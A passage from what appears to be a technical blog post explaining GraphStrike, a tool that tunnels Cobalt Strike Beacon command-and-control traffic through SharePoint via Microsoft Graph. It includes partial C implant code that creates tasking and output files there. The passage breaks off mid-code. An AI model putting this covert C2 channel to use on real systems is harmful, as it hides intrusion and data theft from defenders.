<p data-renderer-start-pos="59001">AMFTYYnvh-NZ7q87nb32BV03vz-tP1vaoxmfdwKTeba6D7azteJONYntyP79j7L7-QWynYagPhJ0qgBk7albtTKi4tmJlfIBfcoVaHcmMehvzQcZar1OC1hQj64cXfBDSRs-u2Sp9P0GNglZejsQ7BcCA-3cirbd0wInvbhStW0</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="205">
<p data-renderer-start-pos="59178">Delimiter</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="553">
<p data-renderer-start-pos="59191">pD9-tK</p>
</td>
</tr>
<tr>
<td colspan="1" rowspan="1" data-colwidth="205">
<p data-renderer-start-pos="59203">Beacon Session ID</p>
</td>
<td colspan="1" rowspan="1" data-colwidth="553">
<p data-renderer-start-pos="59224">1123716960</p>
</td>
</tr>
</tbody>
</table>
<div class="sentinel-right"></div>
</div>
</div>
<p data-renderer-start-pos="59239">By organizing things this way we:</p>
<ol class="ak-ol" start="1" data-indent-level="1">
<li>
<p data-renderer-start-pos="59277">Associate the required Beacon metadata and session ID with each http-get and http-post request.</p>
</li>
<li>
<p data-renderer-start-pos="59376">Can correlate TS tasking files and Beacon output files within SharePoint as belonging to the same Beacon (because the Beacon metadata is found in both file names).</p>
</li>
</ol>
<p data-renderer-start-pos="59543">To map this to Beacon’s HTTP transaction, Beacon will make it’s http-get requests to the TS tasking file to download the file contents. The server response to the http-get comes from Microsoft’s server that hosts the SharePoint file (NOT the TS) and contains the TS tasking which was previously uploaded by the GraphStrike server. Because the Beacon’s unique metadata is used as the name of the file, GraphStrike knows that all tasking for this specific Beacon as issued in Cobalt Strike should be uploaded here.</p>
<p data-renderer-start-pos="60058">When Beacon has output from tasking, it initiates its http-post cycle in which it uploads the data to the Beacon output file. Beacon doesn’t actually do anything with or care about server output from http-post requests, so we can simply discard what Microsoft’s servers say in response to this request. The GraphStrike server can then download the data stored in the Beacon output file, find the Beacon session ID within the file name by splitting on the pre-defined delimiter, and then communicate this data to the TS for processing.</p>
<p data-renderer-start-pos="60594">Beacon is of course responsible for creating both files within SharePoint because its metadata and session ID are determined at run time. The code to do so also resides in the HttpOpenRequestA_Hook function and is logically gated so that Beacon only creates new files in SharePoint once; the TS Tasking file is created during the first http-get cycle and the output file is made during the first http-post cycle.</p>
<p data-renderer-start-pos="61008">TS tasking file creation:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-c0">// If this is the first GET request for the Beacon, we need to create the TS output file for the Beacon to read from. </span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">firstGet</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// ------------------------------------ Upload new file for TS tasking ---------------------------------------</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Assemble URI to create new file in SharePoint using the Beacon metadata as a name</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    tempUri = </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">calloc</span><span class="enlighter-g1">(</span><span class="enlighter-text">1000, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    LPCSTR fileName = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strstr</span><span class="enlighter-g1">(</span><span class="enlighter-text">lpszObjectName, HTTP_GET_PREFIX </span><span class="enlighter-g1">)</span><span class="enlighter-text"> + pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">HTTP_GET_PREFIX</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">sprintf</span><span class="enlighter-g1">(</span><span class="enlighter-text">tempUri, </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"%s/root:/%s:/content"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, SHAREPOINT_ADDRESS, fileName </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Store metaData to be used later to create the Beacon output channel as well </span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">metaData = </span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">calloc</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">fileName</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + 1, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strcpy</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">metaData, fileName</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    response = </span><span class="enlighter-m0">MakeWebRequest</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">hInternet, GRAPH_ADDRESS, tempUri, PUT_VERB, pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpPostHeaders, </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">, pMemAddrs </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!response</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> INVALID_HANDLE_VALUE;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Parse out fileId from response</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">ParseValue</span><span class="enlighter-g1">((</span><span class="enlighter-k5">char</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-text">response, </span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"id\":\""</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, id, 100, </span><span class="enlighter-e0">FALSE</span><span class="enlighter-text">, pMemAddrs</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Assemble httpGetUri that will be used for subsequent Beacon comms</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    reqSize = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">SHAREPOINT_ADDRESS</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">id</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"/items//content"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> + 1</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpGetUri = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">calloc</span><span class="enlighter-g1">(</span><span class="enlighter-text">reqSize, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">sprintf</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpGetUri, </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"%s/items/%s/content"</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, SHAREPOINT_ADDRESS, id</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Free buffers</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">free</span><span class="enlighter-g1">(</span><span class="enlighter-text">response</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">free</span><span class="enlighter-g1">(</span><span class="enlighter-text">tempUri</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Toggle firstGet to false so we don't repeat this loop.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">firstGet = </span><span class="enlighter-e0">FALSE</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div></div><div class="enlighter-raw">... Trimmed for Brevity ...

// If this is the first GET request for the Beacon, we need to create the TS output file for the Beacon to read from. 
if (pMemAddrs-&gt;firstGet)
{
    // ------------------------------------ Upload new file for TS tasking ---------------------------------------
    
    // Assemble URI to create new file in SharePoint using the Beacon metadata as a name
    tempUri = C_PTR ( pMemAddrs-&gt;Api.msvcrt.calloc(1000, sizeof(char)) );
    LPCSTR fileName = pMemAddrs-&gt;Api.msvcrt.strstr(lpszObjectName, HTTP_GET_PREFIX ) + pMemAddrs-&gt;Api.msvcrt.strlen(HTTP_GET_PREFIX);
    pMemAddrs-&gt;Api.msvcrt.sprintf(tempUri, C_PTR ( OFFSET ( "%s/root:/%s:/content" ) ), SHAREPOINT_ADDRESS, fileName );

    // Store metaData to be used later to create the Beacon output channel as well 
    pMemAddrs-&gt;metaData = (char*)pMemAddrs-&gt;Api.msvcrt.calloc(pMemAddrs-&gt;Api.msvcrt.strlen(fileName) + 1, sizeof(char));
    pMemAddrs-&gt;Api.msvcrt.strcpy(pMemAddrs-&gt;metaData, fileName);

    response = MakeWebRequest(pMemAddrs-&gt;hInternet, GRAPH_ADDRESS, tempUri, PUT_VERB, pMemAddrs-&gt;httpPostHeaders, NULL, pMemAddrs );
    if (!response)
        return INVALID_HANDLE_VALUE;

    // Parse out fileId from response
    ParseValue((char*)response, (char*)C_PTR ( OFFSET ( "id\":\"" ) ), id, 100, FALSE, pMemAddrs);

    // Assemble httpGetUri that will be used for subsequent Beacon comms
    reqSize = pMemAddrs-&gt;Api.msvcrt.strlen(SHAREPOINT_ADDRESS) + pMemAddrs-&gt;Api.msvcrt.strlen(id) + pMemAddrs-&gt;Api.msvcrt.strlen(C_PTR ( OFFSET ( "/items//content" ) ) + 1);
    pMemAddrs-&gt;httpGetUri = pMemAddrs-&gt;Api.msvcrt.calloc(reqSize, sizeof(char));
    pMemAddrs-&gt;Api.msvcrt.sprintf(pMemAddrs-&gt;httpGetUri, C_PTR ( OFFSET ( "%s/items/%s/content") ), SHAREPOINT_ADDRESS, id);

    // Free buffers
    pMemAddrs-&gt;Api.msvcrt.free(response);
    pMemAddrs-&gt;Api.msvcrt.free(tempUri);

    // Toggle firstGet to false so we don't repeat this loop.
    pMemAddrs-&gt;firstGet = FALSE;
}

... Trimmed for Brevity ...</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">... Trimmed for Brevity ...

//&nbsp;If&nbsp;this&nbsp;is&nbsp;the&nbsp;first&nbsp;GET&nbsp;request&nbsp;for&nbsp;the&nbsp;Beacon,&nbsp;we&nbsp;need&nbsp;to&nbsp;create&nbsp;the&nbsp;TS&nbsp;output&nbsp;file&nbsp;for&nbsp;the&nbsp;Beacon&nbsp;to&nbsp;read&nbsp;from.&nbsp;
if&nbsp;(pMemAddrs-&gt;firstGet)
{
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;------------------------------------&nbsp;Upload&nbsp;new&nbsp;file&nbsp;for&nbsp;TS&nbsp;tasking&nbsp;---------------------------------------
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Assemble&nbsp;URI&nbsp;to&nbsp;create&nbsp;new&nbsp;file&nbsp;in&nbsp;SharePoint&nbsp;using&nbsp;the&nbsp;Beacon&nbsp;metadata&nbsp;as&nbsp;a&nbsp;name
&nbsp;&nbsp;&nbsp;&nbsp;tempUri&nbsp;=&nbsp;C_PTR&nbsp;(&nbsp;pMemAddrs-&gt;Api.msvcrt.calloc(1000,&nbsp;sizeof(char))&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR&nbsp;fileName&nbsp;=&nbsp;pMemAddrs-&gt;Api.msvcrt.strstr(lpszObjectName,&nbsp;HTTP_GET_PREFIX&nbsp;)&nbsp;+&nbsp;pMemAddrs-&gt;Api.msvcrt.strlen(HTTP_GET_PREFIX);
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.sprintf(tempUri,&nbsp;C_PTR&nbsp;(&nbsp;OFFSET&nbsp;(&nbsp;"%s/root:/%s:/content"&nbsp;)&nbsp;),&nbsp;SHAREPOINT_ADDRESS,&nbsp;fileName&nbsp;);

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Store&nbsp;metaData&nbsp;to&nbsp;be&nbsp;used&nbsp;later&nbsp;to&nbsp;create&nbsp;the&nbsp;Beacon&nbsp;output&nbsp;channel&nbsp;as&nbsp;well&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;metaData&nbsp;=&nbsp;(char*)pMemAddrs-&gt;Api.msvcrt.calloc(pMemAddrs-&gt;Api.msvcrt.strlen(fileName)&nbsp;+&nbsp;1,&nbsp;sizeof(char));
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.strcpy(pMemAddrs-&gt;metaData,&nbsp;fileName);

&nbsp;&nbsp;&nbsp;&nbsp;response&nbsp;=&nbsp;MakeWebRequest(pMemAddrs-&gt;hInternet,&nbsp;GRAPH_ADDRESS,&nbsp;tempUri,&nbsp;PUT_VERB,&nbsp;pMemAddrs-&gt;httpPostHeaders,&nbsp;NULL,&nbsp;pMemAddrs&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!response)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;INVALID_HANDLE_VALUE;

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Parse&nbsp;out&nbsp;fileId&nbsp;from&nbsp;response
&nbsp;&nbsp;&nbsp;&nbsp;ParseValue((char*)response,&nbsp;(char*)C_PTR&nbsp;(&nbsp;OFFSET&nbsp;(&nbsp;"id\":\""&nbsp;)&nbsp;),&nbsp;id,&nbsp;100,&nbsp;FALSE,&nbsp;pMemAddrs);

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Assemble&nbsp;httpGetUri&nbsp;that&nbsp;will&nbsp;be&nbsp;used&nbsp;for&nbsp;subsequent&nbsp;Beacon&nbsp;comms
&nbsp;&nbsp;&nbsp;&nbsp;reqSize&nbsp;=&nbsp;pMemAddrs-&gt;Api.msvcrt.strlen(SHAREPOINT_ADDRESS)&nbsp;+&nbsp;pMemAddrs-&gt;Api.msvcrt.strlen(id)&nbsp;+&nbsp;pMemAddrs-&gt;Api.msvcrt.strlen(C_PTR&nbsp;(&nbsp;OFFSET&nbsp;(&nbsp;"/items//content"&nbsp;)&nbsp;)&nbsp;+&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;httpGetUri&nbsp;=&nbsp;pMemAddrs-&gt;Api.msvcrt.calloc(reqSize,&nbsp;sizeof(char));
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.sprintf(pMemAddrs-&gt;httpGetUri,&nbsp;C_PTR&nbsp;(&nbsp;OFFSET&nbsp;(&nbsp;"%s/items/%s/content")&nbsp;),&nbsp;SHAREPOINT_ADDRESS,&nbsp;id);

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Free&nbsp;buffers
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.free(response);
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.free(tempUri);

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Toggle&nbsp;firstGet&nbsp;to&nbsp;false&nbsp;so&nbsp;we&nbsp;don't&nbsp;repeat&nbsp;this&nbsp;loop.
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;firstGet&nbsp;=&nbsp;FALSE;
}

...&nbsp;Trimmed&nbsp;for&nbsp;Brevity&nbsp;...</pre>
</div>
<div role="presentation">
<div>Beacon output file creation:</div>
</div>
</div>
</div>
</div>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-c0">// If this is the first POST request for the Beacon, create the Beacon output file for the TS to read from.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">firstPost &amp;&amp; !pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">activeGet</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text">        </span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// ------------------------------------ Upload new file for Beacon output --------------------------------------- </span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Assemble URI to create new file in SharePoint using the Beacon metadata + beaconId as a name.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    tempUri = </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">calloc</span><span class="enlighter-g1">(</span><span class="enlighter-text">1000, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    LPCSTR beaconId = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strstr</span><span class="enlighter-g1">(</span><span class="enlighter-text">lpszObjectName, HTTP_POST_PREFIX </span><span class="enlighter-g1">)</span><span class="enlighter-text"> + pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">HTTP_POST_PREFIX</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">sprintf</span><span class="enlighter-g1">(</span><span class="enlighter-text">tempUri, </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"%s/root:/%s%s%s:/content"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, SHAREPOINT_ADDRESS, pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">metaData, BID_DELIMITER, beaconId </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Send request</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    response = </span><span class="enlighter-m0">MakeWebRequest</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">hInternet, GRAPH_ADDRESS, tempUri, PUT_VERB, pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpPostHeaders, </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">, pMemAddrs </span><span class="enlighter-g1">)</span><span class="enlighter-text">; </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Parse out fileId from response</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">ParseValue</span><span class="enlighter-g1">((</span><span class="enlighter-k5">char</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-text">response, </span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"id\":\""</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, id, 100, </span><span class="enlighter-e0">FALSE</span><span class="enlighter-text">, pMemAddrs</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Assemble httpPostUri that will be used for subsequent Beacon comms</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    reqSize = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">SHAREPOINT_ADDRESS</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">id</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span 